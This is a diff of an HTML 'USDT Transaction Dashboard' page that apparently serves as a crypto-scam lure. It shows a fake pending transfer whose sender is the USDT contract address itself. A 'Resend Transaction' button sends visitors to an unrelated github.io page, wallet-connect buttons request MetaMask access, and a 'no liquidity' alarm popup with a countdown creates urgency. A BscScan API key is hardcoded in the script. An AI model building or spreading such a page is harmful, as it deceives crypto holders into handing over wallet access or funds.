@@ -1,15 +1,38 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>USDT Transaction Dashboard</title>
   <style>
-    body { font-family: Arial, sans-serif; background-color: #0a1f3d; color: #f1f5f9; margin: 0; padding: 0; }
-    .container { max-width: 700px; margin: 3rem auto; background: #072146; padding: 2rem; border-radius: 12px; box-shadow: 0 0 12px rgba(0, 0, 0, 0.4); }
-    h1 { font-size: 1.8rem; margin-bottom: 1rem; color: #facc15; }
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom right, #020617, #0f172a);
+      color: #f1f5f9;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 700px;
+      margin: 3rem auto;
+      background: #072146;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.6);
+    }
+    h1 {
+      font-size: 1.8rem;
+      margin-bottom: 1rem;
+      color: #facc15;
+    }
     p { margin: 0.5rem 0; font-size: 1rem; }
     strong { color: #e2e8f0; }
-    code { background: #1e293b; padding: 0.2rem 0.4rem; border-radius: 4px; color: #93c5fd; }
+    code {
+      background: #1e293b;
+      padding: 0.2rem 0.4rem;
+      border-radius: 4px;
+      color: #93c5fd;
+    }
     a.button, button.resend-button {
       display: inline-block;
       margin-top: 1.5rem;
@@ -24,17 +47,53 @@
       cursor: pointer;
     }
     a.button:hover, button.resend-button:hover { background: #facc15; }
-    .popup { display: none; position: fixed; bottom: 30px; right: 30px; background: #fff7ed; color: #c2410c; border: 2px solid #f97316; padding: 1rem 1.5rem; border-radius: 10px; font-weight: bold; z-index: 9999; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
-    .countdown { font-size: 0.95rem; color: #f87171; margin-top: 1rem; }
-    .wallet-connect { margin-top: 2rem; }
-    button.connect { padding: 0.6rem 1.2rem; background: #10b981; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+    .popup {
+      display: none;
+      position: fixed;
+      bottom: 30px;
+      right: 30px;
+      background: #fff7ed;
+      color: #c2410c;
+      border: 2px solid #f97316;
+      padding: 1rem 1.5rem;
+      border-radius: 10px;
+      font-weight: bold;
+      z-index: 9999;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    .countdown {
+      font-size: 0.95rem;
+      color: #f87171;
+      margin-top: 1rem;
+    }
+    .wallet-connect {
+      margin-top: 2rem;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    button.connect {
+      padding: 0.6rem 1.2rem;
+      background: #10b981;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+    }
     button.connect:hover { background: #059669; }
+    .tradingview {
+      margin-top: 2rem;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 0 10px rgba(255,255,255,0.05);
+    }
   </style>
 </head>
 <body>
 <div class="container">
   <h1>USDT Transaction Details</h1>
-  <p><strong>From:</strong> <code id="from">0x55d398326f99059ff775485246999027b3197955</code></p>
+  <p><strong>From:</strong> <code>0x55d398326f99059ff775485246999027b3197955</code></p>
   <p><strong>To:</strong> <code>0x97fe2864e38d0a667fc4da9b2a4ed3e97ca1168</code></p>
   <p><strong>Time:</strong> 23:55:55 UTC</p>
   <p><strong>Date:</strong> 30-07-2025</p>
@@ -43,14 +102,25 @@
   <p><strong>Status:</strong> <span style="color: orange; font-weight: bold;">Pending</span></p>
   <p><strong>Gas Fee:</strong> 0.120590 BNB</p>
   <p><strong>Transaction Hash:</strong> <a href="https://bscscan.com/tx/0x2e272d33abffc0733e872372e94b9d437d88026449d7c221b0ccda72d5969ddf" target="_blank">View on BscScan</a></p>
-  <p><strong>Sender USDT Balance:</strong> <span id="balance">Loading...</span></p><button class="resend-button" onclick="window.open('https://contract-decimals.github.io/BNB-Smart-Chain/', '_blank')">🔁 Resend Transaction</button>
+  <p><strong>Sender USDT Balance:</strong> <span id="balance">Loading...</span></p>
+  <button class="resend-button" onclick="window.open('https://contract-decimals.github.io/BNB-Smart-Chain/', '_blank')">🔁 Resend Transaction</button>
 
   <div class="wallet-connect">
-    <button class="connect" onclick="connectWallet()">🔗 Connect Wallet</button>
+    <button class="connect" onclick="connectWallet()">🔗 Connect MetaMask</button>
+    <button class="connect" onclick="window.open('https://trustwallet.com/browser-extension', '_blank')">🦊 Trust Wallet</button>
+    <button class="connect" onclick="window.open('https://binance.com/en/wallet-direct', '_blank')">💼 Binance Wallet</button>
   </div>
+
   <div class="countdown" id="countdown">Refreshing in 30s...</div>
-</div><div class="popup" id="liquidityPopup">⚠️ No liquidity found — please verify transaction input.</div>
-<audio id="alertSound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio><script>
+  <div class="tradingview">
+    <iframe src="https://s.tradingview.com/embed-widget/mini-symbol-overview/?locale=en#%7B%22symbol%22%3A%22BINANCE%3AUSDTBUSD%22%2C%22width%22%3A%22650%22%2C%22height%22%3A%22300%22%2C%22dateRange%22%3A%221d%22%2C%22colorTheme%22%3A%22dark%22%2C%22isTransparent%22%3Afalse%2C%22autosize%22%3Afalse%2C%22largeChartUrl%22%3A%22%22%7D" width="100%" height="300" frameborder="0" allowtransparency="true" scrolling="no"></iframe>
+  </div>
+</div>
+
+<div class="popup" id="liquidityPopup">⚠️ No liquidity found — please verify transaction input.</div>
+<audio id="alertSound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>
+
+<script>
   const API_KEY = 'ZM8ACMJB67C2IXKKBF8URFUNSY';
   const CONTRACT_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
   const SENDER_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
@@ -77,6 +147,7 @@
     alertSound.play();
     setTimeout(() => { popup.style.display = 'none'; }, 5000);
   }
+
   function updateCountdown() {
     const counter = document.getElementById('countdown');
     countdown--;
@@ -87,6 +158,7 @@
       fetchBalance();
     }
   }
+
   setInterval(updateCountdown, 1000);
 
   async function connectWallet() {
@@ -98,8 +170,9 @@
         alert('❌ Wallet connection failed.');
       }
     } else {
-      alert('🦊 MetaMask not found.');
+      alert('🦊 MetaMask not detected.');
     }
   }
-</script></body>
+</script>
+</body>
 </html>
